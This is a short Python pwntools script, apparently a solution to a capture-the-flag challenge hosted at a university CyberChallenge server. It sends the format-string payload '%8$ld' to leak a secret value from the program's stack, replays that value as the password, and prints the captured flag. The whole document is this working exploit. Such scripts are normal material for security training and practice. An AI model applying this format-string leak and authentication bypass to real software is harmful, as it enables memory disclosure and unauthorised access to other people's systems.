from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9101

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

conn.recvuntil(b":")
conn.sendline(b"%8$ld")

conn.recvuntil(b", ")
value = conn.recvline(keepends=False)
print(value.decode())

conn.recvuntil(b":")
conn.sendline(value)

if(b"Invalid password!" in conn.recvline()):
    conn.close()
    print("ERROR")
else:
    print(conn.recvuntil(b"flag: "))
    flag = conn.recvuntil(b"}").decode()
    conn.close()
    print(flag)